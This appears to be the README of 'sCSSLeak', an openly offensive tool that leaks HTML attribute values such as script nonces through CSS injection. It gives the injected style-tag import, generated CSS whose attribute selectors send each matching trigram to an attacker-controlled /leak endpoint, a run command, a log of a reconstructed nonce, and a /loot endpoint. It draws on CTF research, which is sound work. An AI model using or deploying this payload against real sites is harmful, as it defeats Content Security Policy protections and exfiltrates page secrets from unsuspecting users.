# sCSSLeak
This tool allows to leak HTML tag attributes using a standalone CSS file. The technique is solely inspired by [`newdiary`](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/#web-newdiary-14-solves) from 0CTF.


## Leak Technique 

The approach involves finding a method to assign multiple background images to a single element **using a standalone CSS file**, ensuring that the browser fetches all of them. The [`cross-fade()`](https://developer.mozilla.org/en-US/docs/Web/CSS/cross-fade) CSS function accepts two images and a percentage as input and produces an image obtained by blending the two images.

# Attack Prerequisites 

- Style tag injection 
- Target attribute must not have ```type=hidden``` (which is usually the case) but still useful for leaking tags such as `script[nonce]` and others

This will only work on Chrome as other brwoser does not support `cross-fade`


# Configuration

The script will retrieve and reconstruct the nonces from the requests and print them to both the console where the script was executed and the **/loot** endpoint.

- `--base_url`: The base URL of the server.
- `--nonce_len`: The length of the nonce to be retrieved.
- `--tag`: A tag to identify the type of requests.
- `--attr`: The attribute name containing the nonce.
- `--port` port 
- `--charset` default='abcdefghijklmnopqrstuvwxyz0123456789'

# Usage

To leak the nonce attribute from the script tag i.e: 

```html 
<head>
<style>@import url(http://127.0.0.1:8081/leak);</style>
</head>
<body>
  <script nonce="[random string]"></script>
</body>
```

The script must be executed as follows: 

```bash
python3 main.py --base_url http://127.0.0.1:8081 --nonce_len 26 --tag script --attr nonce --port 8081
```

Which can then be imported as:

```<style> @import url(http://127.0.0.1:8081/leak); </style>```

Which should have already initiatied the `/leak` endpoint with the following structure

```css
script[nonce*='aaa']{ --aaa: url('http://127.0.0.1:8081/leak?x=aaa'); }
script[nonce*='aab']{ --aab: url('http://127.0.0.1:8081/leak?x=aab'); }
...
...
script{display:block;}script { background-image: -webkit-cross-fade(-webkit-cross-fade(var(--aaa, none), var(--aab, none), 50%), -webkit-cross-fade(var(--aac, none), var(--aad, none), 50%), 50%), -webkit-cross-fade(-webkit-cross-fade(var(--aae, none), var(--aaf, none), 50%), -webkit-cross-fade(var(--aag, none), var(--aah, none), 50%), 50%), -webkit-cross-fade(-webkit-cross-fade(var(--aai, none), var(--aaj, none), 50%), -webkit-cross-fade(var(--aak, none), var(--aal, none), 50%), 50%)
...
```

After execution, the http log should look like the following

```
127.0.0.1 - - [24/Jan/2024 05:15:24] "GET /leak HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=bnm HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=cvb HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=fkg HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=fsp HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=efs HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=ghj HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=hjy HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=mwe HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=krz HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=nmw HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=jyk HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=kgh HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=pxe HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=rzx HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=spx HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=wef HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=vbn HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=xcv HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=29f HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=ykr HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=9fk HTTP/1.1" 200 -
[+] leaked nonce: 4329fkghjykrzxcvbnmwefspxe
[+] leaked nonce: 4329fkghjykrzxcvbnmwefspxe
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=329 HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=zxc HTTP/1.1" 200 -
127.0.0.1 - - [24/Jan/2024 05:15:26] "GET /leak?x=432 HTTP/1.1" 200 -
```

The leaked value can then be found on the `/loot` endpoint as well as the terminal.


# Installation 

Clone the repository & Install the dependencies
```
git clone https://github.com/ixSly/sCSSLeak
cd sCSSLeak
python3 -m pip install -r requirements.txt
```

# Resources

- [newdiary - 0CTF Challenge](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/#web-newdiary-14-solves)
- [Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/)

- [ What can we do with single CSS injection? ](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/)

- [One Shot CSS Injection ](https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html)
